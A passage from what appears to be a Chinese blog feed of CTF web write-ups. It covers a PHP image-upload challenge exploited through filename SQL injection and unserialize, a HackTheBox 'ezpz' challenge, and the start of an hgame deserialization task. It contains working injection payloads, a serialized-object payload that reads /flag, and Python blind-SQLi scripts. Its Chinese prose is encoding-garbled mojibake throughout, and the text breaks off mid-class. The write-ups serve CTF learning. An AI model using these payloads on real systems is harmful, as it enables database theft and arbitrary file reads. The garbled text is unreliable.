getimagesize($_FILES[$input][&quot;tmp_name&quot;]);        $my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]);        $array[&quot;attr&quot;] = serialize($my_ext);        $id = $this-&gt;save($array);        if ($id == 0){            die(&quot;Something wrong!&quot;);        }        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;p&gt;Your images is uploaded successfully. And your image&#39;s id is $id.&lt;/p&gt;&quot;;    }    public function getfile($input)    {        if(isset($input)){            $rs = $this-&gt;check($_FILES[$input]);        }        return $rs;    }    public function check($info)    {        $basename = substr(md5(time().uniqid()),9,16);        $filename = $info[&quot;name&quot;];        $ext = substr(strrchr($filename, &#39;.&#39;), 1);        $cate_exts = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);        if(!in_array($ext,$cate_exts)){            die(&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;);        }        $title = str_replace(&quot;.&quot;.$ext,&#39;&#39;,$filename);        return array(&#39;title&#39;=&gt;$title,&#39;filename&#39;=&gt;$basename.&quot;.&quot;.$ext,&#39;ext&#39;=&gt;$ext,&#39;path&#39;=&gt;$this-&gt;folder.$basename.&quot;.&quot;.$ext);    }    public function save($data)    {        if(!$data || !is_array($data)){            die(&quot;Something wrong!&quot;);        }        $id = $this-&gt;insert_array($data);        return $id;    }    public function insert_array($data)    {            $con = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;pic_base&quot;);        if (mysqli_connect_errno($con))         {             die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error());        }        $sql_fields = array();        $sql_val = array();        foreach($data as $key=&gt;$value){            $key_temp = str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\0\0\0&#39;, $key);            $value_temp = str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\0\0\0&#39;, $value);            $sql_fields[] = &quot;`&quot;.$key_temp.&quot;`&quot;;            $sql_val[] = &quot;&#39;&quot;.$value_temp.&quot;&#39;&quot;;        }        $sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;        mysqli_query($con, $sql);        $id = mysqli_insert_id($con);        mysqli_close($con);        return $id;    }    public function view_files($path){        if ($this-&gt;ifview == False){            return False;            //The function is not yet perfect, it is not open yet.        }        $content = file_get_contents($path);        echo $content;    }    function __destruct(){        # Read some config html        $this-&gt;view_files($this-&gt;config);    }}?&gt;</code></pre><p>å…ˆä»æ¯”è¾ƒç›´è§‚çš„åœ°æ–¹å¼€å§‹å®¡è®¡ã€‚æˆ‘ä¸ªäººé¦–å…ˆä»helper.phpå¼€å§‹è§‚å¯Ÿã€‚å› ä¸ºè¿™å¾ˆæœ‰å¯èƒ½å­˜åœ¨æ˜¯ä¸€ä¸ªååºåˆ—åŒ–åˆ©ç”¨çš„ä»£ç ã€‚æœç„¶é¦–å…ˆæ³¨æ„åˆ°ï¼Œhelperç±»ä¸­ï¼Œæœ‰ç€ç»å…¸çš„<code>_destruct()</code>é­”æœ¯æ–¹æ³•ï¼Œå®ƒè°ƒç”¨çš„<code>view_file()</code>æ–¹æ³•ï¼Œä¼šæ‰§è¡Œ<code>file_get_contents()</code>å‡½æ•°ã€‚æ˜¾ç„¶æ˜¯åˆ©ç”¨å®ƒã€‚å›è¿‡å¤´å†ä»”ç»†çœ‹ä¸‹è§¦å‘æ–¹å¼ã€‚<br>é¦–å…ˆï¼Œåœ¨helper.phpä¸­ï¼Œå‘ç°å›¾ç‰‡çš„<code>attrå±æ€§</code>è¢«åºåˆ—åŒ–å­˜å‚¨ã€‚</p><pre><code>$array[&quot;attr&quot;] = serialize($my_ext);</code></pre><p>ä¹‹ååœ¨show.phpä¸­ï¼Œè°ƒç”¨äº†ä¸€æ¬¡ååºåˆ—åŒ–</p><pre><code class="php">if($row[&quot;attr&quot;]){$attr_temp = str_replace(&#39;\0\0\0&#39;, chr(0).&#39;*&#39;.chr(0), $row[&quot;attr&quot;]);$attr = unserialize($attr_temp);}</code></pre><p>ç„¶åæ³¨æ„æˆ‘ä»¬çš„uploadå›¾ç‰‡æ“ä½œï¼Œä¼ å›¾ç‰‡åï¼Œè°ƒç”¨äº†<code>check()</code>å‡½æ•°ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å¯¹æ–‡ä»¶ååšæ£€æµ‹å°±è¢«ä¿å­˜ä¸ºinfoï¼Œä¹‹åä½œä¸ºå‚æ•°ä¼ è¿›äº†<code>save()</code>å‡½æ•°ã€‚<code>save()</code>æœ¬è´¨ä¸Šæ‰§è¡Œäº†ä¸€æ¬¡sqlè¯­å¥ï¼š</p><pre><code class="php">$sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;</code></pre><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å…¶å®æ˜¯é€šè¿‡æ§åˆ¶ä¸Šä¼ å›¾ç‰‡çš„æ–‡ä»¶åï¼Œè§¦å‘sqlæ³¨å…¥ï¼Œè¿›ä¸€æ­¥è§¦å‘ååºåˆ—åŒ–ï¼Œè¾¾åˆ°ç›®çš„ã€‚<br>æ‰€ä»¥ç°ç”Ÿæˆååºåˆ—åŒ–payoad:</p><pre><code class="php">&lt;?phpclass helper{    protected $ifview = True;    protected $config = &quot;/flag&quot;;}$a=new helper();echo(serialize($a));</code></pre><p>å¾—åˆ°ç»“æœéœ€è¦è°ƒæ•´ä¸º</p><pre><code class="php">O:6:&quot;helper&quot;:2:{s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;/flag&quot;;}</code></pre><p>è¿™æ˜¯ç”±äºprotectedçš„å±æ€§å†³å®šçš„ã€‚å¦‚æœæ˜¯privateåˆ™æ˜¯ä¸¤ä¸ª<code>%00%00</code>ã€‚<br>ç„¶åæ„é€ æ–‡ä»¶åï¼Œæˆ‘ä»¬åªéœ€è®©æ–‡ä»¶çš„åºåˆ—åŒ–éƒ¨åˆ†æ”¹ä¸ºæˆ‘ä»¬çš„payloadã€‚åŸºäºæ™®é€šä¸Šä¼ æ‰§è¡Œè¯­å¥ä¸ºï¼š</p><pre><code class="php">INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(&#39;1&#39;,&#39;1.jpg&#39;,&#39;jpg&#39;,&#39;pic/f20c76cc4fb41838.jpg&#39;,&#39;a:2:{s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;}&#39;)</code></pre><p>æˆ‘ä»¬æŠŠæ–‡ä»¶åæ”¹æ”¹</p><pre><code class="php">INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#39;1.jpg&#39;)</code></pre><p>å…¶ä¸­çš„ç”±äºå¼•å·é—®é¢˜ï¼Œæˆ‘ä»¬çš„payloadéœ€è¦å­—ç¬¦ä¸²è½¬16è¿›åˆ¶ã€‚<br>ä¸Šä¼ æ–‡ä»¶å³å¯è§¦å‘å¾—åˆ°flag.<br><img src="/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-ezpz</title>
      <link href="2020/02/06/hackthebox-ezpz/"/>
      <url>2020/02/06/hackthebox-ezpz/</url>
      
        <content type="html"><![CDATA[<p>hacktheboxä¸Šçš„web challenge ezpzæ˜¯å»å¹´åäºŒæœˆæœ«æ‰æ–°å‡ºçš„ä¸€é“ctfé¢˜ç›®ã€‚è¿™é“é¢˜ç›¸å½“çš„æœ‰æ„æ€ï¼Œè€Œä¸”å¯¹æˆ‘è¿˜æ˜¯æ¯”è¾ƒæœ‰éš¾åº¦çš„ï¼Œä½†æ˜¯åšå‡ºæ¥çš„é‚£ä¸€ç¬é—´åˆå‘ç°å…¶å®å¹¶éé‚£ä¹ˆä»¤äººå›°æ‰°ï¼Œåè€Œå­¦åˆ°äº†è®¸å¤šã€‚æ‰€ä»¥åœ¨æ­¤è®°å½•ä¸€ä¸‹åšé¢˜è¿‡ç¨‹ã€‚<br>æ„Ÿè°¢zjyå¸ˆå‚…ä»¥åŠå¤–å›½ç½‘å‹Z1LV3Rçš„æç¤º</p><a id="more"></a><p>é¦–å…ˆè¿›å…¥é¡µé¢ï¼Œå‘ç°æœ‰ä¸¤ä¸ªæŠ¥é”™ï¼š<br><img src="/2020/02/06/hackthebox-ezpz/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="error1"></p><p>å…¶ä¸­ï¼Œç¬¬ä¸€ä¸ªæŠ¥é”™å…¶å®å°±æ˜¯</p><pre><code>PHP: Notice: Undefined variable</code></pre><p>æ„æ€æ˜¯æœ‰æœªå®šä¹‰å˜é‡ï¼Œé‚£ä¹ˆè‡ªç„¶å°±æ˜¯objäº†ã€‚æ‰€ä»¥ä¸‹ä¸€æ­¥æˆ‘ä»¬ä¼ å‚å˜é‡<br><img src="/2020/02/06/hackthebox-ezpz/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="error2"><br>é‚£ä¹ˆå¦‚ä½•è§£å†³ç¬¬äºŒä¸ªé”™è¯¯å‘¢ï¼Ÿä»ä¸­å¯ä»¥çœ‹å‡ºï¼ŒIDä¹‹äºobjå¯èƒ½æ˜¯propertyä¸objectçš„å…³ç³»ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œobjå¯èƒ½æ˜¯åŒ…å«IDçš„æŸç§åºåˆ—åŒ–æ•°æ®çš„å˜é‡ã€‚å®é™…ä¸Šï¼Œå¦‚ä¸‹ä»£ç </p><pre><code class="php">&lt;?php$obj=array(&quot;ID&quot;=&gt;1234);echo($obj-&gt;IDS);#æ­¤å¤„è®¿é—®ä¸€ä¸ªæœªå®šä¹‰çš„IDSè§¦å‘æŠ¥é”™</code></pre><p>ä¸</p><pre><code class="php">&lt;?php$obj=json_decode(&quot;{&#39;ID&#39;:&#39;1234&#39;}&quot;);echo $obj-&gt;IDs;</code></pre><p>çš„è¿”å›éƒ½æ˜¯ï¼š<br><img src="/2020/02/06/hackthebox-ezpz/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="æŠ¥é”™"><br>æ‰€ä»¥æˆ‘ä»¬æ‰èƒ½çœ‹åˆ°å›æ˜¾ã€‚å› æ­¤å°è¯•æ„é€ æ•°æ®å§ã€‚åŠ ä¸Šé¢˜ç›®é¡µé¢æºç ä¸­æç¤ºäº†<code>Hint : base64_encode($data)</code>&gt;ï¼ˆæˆ–è€…æˆ‘ä»¬æŠŠobjç½®ä¸ºæ•°ç»„ï¼Œä¹Ÿå¯ä»¥è§¦å‘æŠ¥é”™ï¼Œæç¤ºæˆ‘ä»¬æ•°æ®éœ€è¦<code>base64encode</code>ï¼‰<br>ç»è¿‡å°è¯•ï¼Œå¯ä»¥å‘ç°æ˜¯è¦å¯¹jsonæ•°æ®ç¼–ç ã€‚é‚£æˆ‘ä»¬ä¼ ä¸€ä¸ªIDå€¼ä¸º1çš„æ•°æ®</p><pre><code>?obj=eyJJRCI6ICIxIn0=</code></pre><p><img src="/2020/02/06/hackthebox-ezpz/4.jpg" class="lazyload" data-srcset="4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è€Œä¼ <code>1&#39;</code>è§¦å‘æŠ¥é”™ï¼Œä¼ <code>1&quot;</code>æ— æŠ¥é”™ã€‚ç¡®è®¤æ˜¯å­˜åœ¨sqlæ³¨å…¥æ¼æ´ï¼Œä¸”æ˜¯å•å¼•å·é—­åˆç±»å‹ã€‚<br>äºæ˜¯ï¼Œé¢˜ç›®è¿›å…¥åˆ°äº†ä¸‹ä¸€é˜¶æ®µï¼Œsqlæ³¨å…¥ã€‚<br>æ˜¾ç„¶ä¸ºäº†è®©æˆ‘ä»¬çš„payloadæ›´æ–¹ä¾¿ï¼Œæœ€å¥½å…ˆå†™å¥½expï¼š</p><pre><code class="python">import requestsimport jsonimport base64from bs4 import BeautifulSoupurl = &quot;http://docker.hackthebox.eu:30163/index.php?obj=&quot;payload=&quot;1&quot;payload = base64.b64encode(json.dumps({&quot;ID&quot;: payload}).encode(&#39;utf-8&#39;))payload = str(payload, &#39;utf-8&#39;)url += payloadr = requests.get(url)soup = BeautifulSoup(r.text, &#39;html.parser&#39;)body = soup.find(&#39;body&#39;).text.strip()print(body)</code></pre><p>äºæ˜¯é€šè¿‡FUZZï¼Œå‘ç°å­˜åœ¨ä¸å°‘è¿‡æ»¤ï¼š</p><pre><code>order byï¼Œconcatinformation_schema.tableswherelimit</code></pre><p>è€Œä¸”ä»¥ä¸Šè¿‡æ»¤éƒ½æ˜¯æ­£åˆ™åŒ¹é…ï¼Œæ²¡æ³•ç”¨æ‹›æ•°ç»•è¿‡ï¼Œåªèƒ½æ‰¾æ›¿ä»£ã€‚<br>é¦–å…ˆ<code>order by</code>ç”¨<code>group by</code>ä»£æ›¿ï¼Œè¿™ç‚¹ä¸éš¾ã€‚å¾—åˆ°å­—æ®µæ•°ä¸º2ã€‚é€—å·è¿‡æ»¤å°±æ¯”è¾ƒå±€é™äº†ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬è¦ä¹ˆä½¿ç”¨ç›²æ³¨ï¼Œè¦ä¹ˆä½¿ç”¨<code>join</code>æ³¨å…¥ã€‚<code>information_schema.tables</code>åœ¨ä¹‹å‰çš„swpuweb1ä¸­ä¹Ÿè§åˆ°è¿‡äº†ï¼Œè‚¯å®šå­˜åœ¨å¯¹åº”çš„æ›¿ä»£è¡¨å¯ä»¥è®©æˆ‘ä»¬è·å–è¡¨åã€‚ä½†æ˜¯<code>where, concat,limit</code>ä¸å¤ªå¥½è§£å†³ã€‚(å…¶å®åˆ°æœ€åæ‰å‘ç°ï¼Œä¸éœ€è¦åº”å¯¹è¿™å‡ ä¸ªè¿‡æ»¤)å…¶ä¸­<code>concat</code>ä¹Ÿè®¸å¯ä»¥ç”¨<code>make_set()</code>èµ·åˆ°è¿æ¥å­—ç¬¦ä¸²çš„æ•ˆæœã€‚ä½†æ˜¯<code>make_set()</code>éœ€è¦è‡³å°‘ä¸¤ä¸ªå‚æ•°ï¼Œä¹Ÿå¿…é¡»è¦é€—å·ï¼›è€Œ<code>where</code>ç­‰ç­‰è¿‡æ»¤ä¹Ÿä¸å¥½åŠã€‚</p><p>æ€»ä¹‹å…ˆä»ç®€å•çš„å¼€å§‹å§ï¼Œæˆ‘é€‰æ‹©ä½¿ç”¨ç›²æ³¨çˆ†å‡ºæ•°æ®åº“åä¸ç‰ˆæœ¬å·ã€‚<br>è„šæœ¬å¦‚ä¸‹ï¼š</p><pre><code class="python">for i in range(1,8):    print(i)    a=0    for j in range(95, 128):        url = &quot;http://docker.hackthebox.eu:32614/index.php?obj=&quot; #10.3.20-MariaDB        payload = &quot;1&#39; and ascii(substr((select database()) from &quot;+str(i)+&quot; for 1))=&quot; + str(j) + &quot;#&quot;        payload = base64.b64encode(json.dumps({&quot;ID&quot;: payload}).encode(&#39;utf-8&#39;))        payload = str(payload, &#39;utf-8&#39;)        url += payload        r = requests.get(url)        soup = BeautifulSoup(r.text, &#39;html.parser&#39;)        body = soup.find(&#39;body&#39;).text.strip()        if &#39;Good&#39; in body:            flag += chr(j)            print(flag)            a=1            break    if a==0:        break</code></pre><p>ç”±äºä¸éœ€è¦ç»•å…¶ä»–è¿‡æ»¤ï¼Œåªéœ€è¦ç”¨<code>select case from {0} for 1</code>ä»£æ›¿<code>substr(case,{0},1)</code>ã€‚ç„¶è€Œç›²æ³¨è„šæœ¬åªèƒ½è§£å†³è¿™ä¸¤ä¸ªé—®é¢˜ï¼Œå¾—ä¸åˆ°è¡¨åï¼Œè€Œä¸”è¿˜è´¼æ…¢ï¼Œæˆ‘åªèƒ½å¦å¯»å…¶ä»–æ–¹æ³•æ³¨å…¥è¡¨åã€‚</p><p>è€ƒè™‘åˆ°é€—å·è¿‡æ»¤æ—¶å¦ä¸€ç§æ–¹æ³•ï¼Œ<code>join</code>æ³¨å…¥ï¼Œæˆ‘ä»¬æ ¹æ®ç¡®è®¤çš„ä¸¤ä¸ª<br>å­—æ®µæ•°æ„é€ payload:</p><pre><code>payload=&quot;1&#39; union select* from (select 1)a join (select 2)b#&quot;</code></pre><p>ç»“æœå‡ºä¹æˆ‘æ„æ–™ä¹‹å¤–ï¼Œå›æ˜¾å‡ºç°äº†</p><pre><code>Good Luck, You&#39;ve got that this is really gonna be an intersting challenge :)2</code></pre><p>ä¹Ÿå°±æ˜¯è¯´ç¬¬äºŒä¸ªå­—æ®µæœ‰å›æ˜¾â€¦â€¦æ‰€ä»¥å…¶å®ä¸éœ€è¦ç›²æ³¨ï¼Œç›´æ¥æ ¹æ®å›æ˜¾union selectåšå°±å¥½äº†ã€‚<br>æ‰€ä»¥ä¸‹ä¸€æ­¥å‡†å¤‡æ‹¿åˆ°è¡¨åï¼Œè¿™é‡Œåœ¨æˆ‘å§‹ç»ˆçº ç»“äºæ— æ³•ä½¿ç”¨<code>group_concat()</code>è¦æ€ä¹ˆæ‹¿åˆ°å…¨éƒ¨æ•°æ®æ—¶ï¼Œå¸ˆå‚…çš„æç¤ºè®©æˆ‘æ³¨æ„åˆ°äº†è¿™é‡Œçš„æŠ¥é”™å‡½æ•°ï¼š</p><pre><code>Warning:  mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, bool given in /var/www/html/index.php on line 34</code></pre><p>è¿™é‡Œçš„sqlæ³¨å…¥æ˜¯é€šè¿‡<code>mysqli_fetch_assoc()</code>è¾¾æˆçš„ï¼Œå…¶è¿”å›å€¼ä¸ºï¼šè¿”å›ä»£è¡¨è¯»å–è¡Œçš„å…³è”æ•°ç»„ã€‚æ‰€ä»¥ä¸éœ€è¦concatï¼Œä¹Ÿå¯ä»¥å¾—åˆ°ä¸€è¡Œæ³¨å…¥å¾—åˆ°çš„å…¨éƒ¨æ•°æ®ã€‚<br>æ‰€ä»¥æ³¨å…¥è¡¨åå°±ä¸å†æ‹…å¿ƒé‚£äº›é—®é¢˜ï¼Œåªè¦æŠŠ<code>information_schema.tables</code>çš„ä»£æ›¿æ‰¾åˆ°å°±å¥½(ç”±äºä¹‹å‰æ³¨å…¥è¿‡ç‰ˆæœ¬ï¼Œç¡®è®¤æ˜¯10.3.20ï¼Œå¯ä»¥ç”¨<code>mysql.innodb_table_stats</code>ä»£æ›¿)</p><pre><code>payload = &quot;&#39; UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name from mysql.innodb_table_stats)b#&quot;</code></pre><p>å¾—åˆ°è¡¨åçš„è¿æ¥å­—ç¬¦ä¸²</p><pre><code>DATAFlagTableUnguessableEzPZgtid_slave_pos</code></pre><p>æ¥ä¸‹æ¥ç”±äº<code>information_schema.columns</code>æ‰¾ä¸åˆ°æ›¿ä»£æ–¹å¼ï¼Œçœ‹æ¥æ˜¯è·Ÿswpuä¸€æ ·çš„æ— åˆ—åæ³¨å…¥äº†ã€‚ä¹‹å‰æ–‡ç« é‡Œä¹Ÿå†™è¿‡ï¼Œè€Œæ­¤å¤„çš„æ— åˆ—åæ³¨å…¥ç¨æœ‰åŒºåˆ«ï¼Œå±äºæœªè¿‡æ»¤<code>`</code>åå¼•å·ï¼Œè¿‡æ»¤æ‰é€—å·çš„æƒ…å†µã€‚æ‰€ä»¥æ¨¡æ¿æ˜¯ï¼š</p><pre><code>0&#39; union select * from (select 1)a join (select `2` from (select * from (select 1)a join (select 2)b join (select 3)c union select * from &#39;è¡¨å&#39;)i )b #</code></pre><p>å®é™…ä¸Šè¿™é“é¢˜ç›®ä¸ç¬¬äº”å±Šä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ› easysqlååˆ†ç›¸åƒï¼Œå› æ­¤å¯ä»¥ä½œä¸ºå‚è€ƒã€‚<br>ä¸‹é¢ä¸€æ­¥å°±æ˜¯è¦çŒœå­—æ®µæ•°è·Ÿè¡¨åäº†ï¼Œé¦–å…ˆåˆ¤æ–­è¡¨åï¼Œä¸Šç½‘æœä¸‹å‘ç°<code>mysql.gtid_slave_pos</code>æ˜¯ä¸€ç§ç³»ç»Ÿè¡¨ï¼Œæ‰€ä»¥ä¼°è®¡æœ€åä¸€éƒ¨åˆ† <code>gtid_slave_pos</code>æ˜¯ä¸€å¼ è¡¨ã€‚ä¹‹åæŒ‰ç…§è¿™ä¸ªæ¨¡æ¿ä¸å˜ï¼Œåªæ”¹è¡¨åï¼Œå‘ç°<code>Data</code>æ˜¯ä¸€å¼ è¡¨ã€‚ä¸”å†…å®¹å°±æ˜¯æˆ‘ä»¬ä¹‹å‰å›æ˜¾çš„sqlæ³¨å…¥æç¤ºçš„å†…å®¹ï¼Œæ•…åˆšå¥½2ä¸ªå­—æ®µã€‚<br>é‚£ä¹ˆä¼°è®¡flagå°±åœ¨<code>FlagTableUnguessableEzPZ</code>è¿™å¼ è¡¨äº†ï¼Œè€Œä¸”çŒœæµ‹ä¸€å¼ æœ‰flagè¡¨åªæœ‰ä¸€åˆ—ï¼Œæ‰€ä»¥æ”¹æˆä¸€ä¸ªå­—æ®µè¯•è¯•</p><pre><code class="python">payload=&quot;&#39; UNION SELECT * FROM (SELECT 1)m JOIN (SELECT `1` from (select * from (select 1)a union select * from  FlagTableUnguessableEzPZ)x )n#&quot;</code></pre><p>æˆåŠŸæ‹¿åˆ°flagã€‚</p><p>æ€»ç»“ä¸‹å§ï¼Œè¿™ç®—æ˜¯ä¸€é“å¾ˆæœ‰è¥å…»çš„é¢˜ç›®äº†ã€‚å¦‚æœèƒ½æ ¹æ®æŠ¥é”™å‘ç°åé¢çš„sqlæ³¨å…¥ï¼Œå°±ç®—è·¨è¿‡äº†ä¸€å¤§æ­¥ï¼Œè¿™äº›ä¸»è¦æ˜¯å¯¹phpç‰¹æ€§çš„ç†è§£ã€‚è€Œæˆ‘åœ¨sqlæ³¨å…¥è¿™ä¸€æ­¥ä¸Šå€’æ˜¯ä¹Ÿå¡äº†å¥½ä¹…â€¦â€¦ä¸è¿‡é¢˜ç›®å¾ˆå¥½çš„å¸®æˆ‘å†ä¸€æ¬¡å¤ä¹ äº†æ— åˆ—åæ³¨å…¥è¿™ä¸ªæœ‰æ„æ€çš„çŸ¥è¯†ç‚¹ï¼Œä»¥åŠ<code>join</code>ç»•è¿‡é€—å·è¿™ä¸€ç»å…¸æ–¹æ³•ã€‚çœ‹æ¥å¯ä»¥ä½œä¸ºbypass<code>information_schema</code>çš„å¸¸è§„æ­¦å™¨ä½¿ç”¨äº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
            <tag> hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ­ç”µhgame-week3</title>
      <link href="2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/"/>
      <url>2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/</url>
      
        <content type="html"><![CDATA[<p>  week3çš„éš¾åº¦æ›´ä¸Šä¸€å±‚æ¥¼ã€‚æœä¸å…¶ç„¶akæ‰webçš„flagå€’äº†ï¼Œæœ€åè¿˜æ˜¯å·®ä¸€é“é¢˜(å…¶å®æ˜¯å› ä¸ºxssèŠ±äº†å¤ªå¤šæ—¶é—´æ²¡åšå‡ºæ¥è‡ªé—­äº†ä¸æƒ³åšäº†)æ€»è€Œè¨€ä¹‹æ”¶è·ä¸å°ï¼Œä¹Ÿå¤´ä¸€æ¬¡æ„Ÿå—åˆ°é«˜æ‰‹åˆ‡ç£‹çš„æ„æ€ã€‚ä¸‹ä¸ªweekä¼°è®¡ä¸ä¼šå†èŠ±è¿™ä¹ˆå¤šæ—¶é—´åšé¢˜äº†ã€‚å¹²è„†å†™ä¸‹æ¬ ç€çš„ç¬”è®°ä»¥åŠå…¶ä»–äº‹å§ã€‚</p><a id="more"></a><h1 id="åºåˆ—ä¹‹äº‰-Ordinal-Scale"><a href="#åºåˆ—ä¹‹äº‰-Ordinal-Scale" class="headerlink" title="åºåˆ—ä¹‹äº‰ - Ordinal Scale"></a>åºåˆ—ä¹‹äº‰ - Ordinal Scale</h1><p>å…¶å®è¿™é“ååºåˆ—åŒ–åº”è¯¥æ˜¯å‡ºç»™è¿™ä¸ªweekçš„ç­¾åˆ°é¢˜ï¼Œå¯æƒœè‡ªå·±å¤ªèœäº†â€¦â€¦ååºåˆ—åŒ–æœç„¶è¿˜æ˜¯è¦å¥½å¥½ç ”ç©¶ä¸€ä¸‹å•Šã€‚å¥½åœ¨æœ€åè¿˜æ˜¯åšå‡ºæ¥äº†ï¼Œè€Œä¸”è¿˜ä½“ä¼šåˆ°ä¸å°‘ååºåˆ—åŒ–çš„è¶£å‘³æ€§ã€‚çœ‹æ¥æ˜¯åº”è¯¥å¥½å¥½ç ”ç©¶ä¸€ç•ªäº†ï¼š<br>é¦–å…ˆæºç æç¤ºsource.zip,æˆ‘ä»¬çœ‹ä¸‹æºç ä¸­æœ‰ç”¨çš„éƒ¨åˆ†ï¼š<br>game.php(ç•¥æ‰æ— ç”¨éƒ¨åˆ†)</p><pre><code class="php">&lt;?php    error_reporting(0);    include_once(&#39;cardinal.php&#39;);    if(isset($_SESSION[&#39;player&#39;])){        $playerName = $_SESSION[&#39;player&#39;];    }else{        $playerName = $_POST[&#39;player&#39;] ?? &#39;&#39;;        if($playerName === &#39;&#39; || is_array($playerName)){            header(&#39;Location: index.php&#39;);            exit;        }    }    $game = new Game($playerName);?&gt;å½“å‰æ’å: &lt;?php echo($game-&gt;rank-&gt;Get());?&gt;      ç»éªŒ: &lt;?php echo($_SESSION[&#39;exp&#39;]);?&gt;    &lt;?php echo($game-&gt;welcomeMsg);?&gt;     &lt;?php echo($game-&gt;rank-&gt;Get());?&gt;    &lt;?php if($game-&gt;rank-&gt;Get() === 1){?&gt;hgame{flag_is_here}</code></pre><p>cardinal.php</p><pre><code class="php">&lt;?phperror_reporting(0);session_start();class Game{       private $encryptKey = &#39;SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW&#39;;    public $welcomeMsg = &#39;%s, Welcome to Ordinal Scale!&#39;;    private $sign = &#39;&#39;;    public $rank;    public function __construct($playerName){        $_SESSION[&#39;player&#39;] = $playerName;        if(!isset($_SESSION[&#39;exp&#39;])){            $_SESSION[&#39;exp&#39;] = 0;        }        $data = [$playerName, $this-&gt;encryptKey];        $this-&gt;init($data);        $this-&gt;monster = new Monster($this-&gt;sign);        $this-&gt;rank = new Rank();    }    private function init($data){        foreach($data as $key =&gt; $value){            $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);            $this-&gt;sign .= md5($this-&gt;sign . $value);        }    }}class Rank{    private $rank;    private $serverKey;     // æœåŠ¡å™¨çš„ Key    private $key = &#39;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#39;;    public function __construct(){        if(!isset($_SESSION[&#39;rank&#39;])){            $this-&gt;Set(rand(2, 1000));            return;        }        $this-&gt;Set($_SESSION[&#39;rank&#39;]);    }    public function Set($no){        $this-&gt;rank = $no;    }    public function Get(){        return $this-&gt;rank;    } 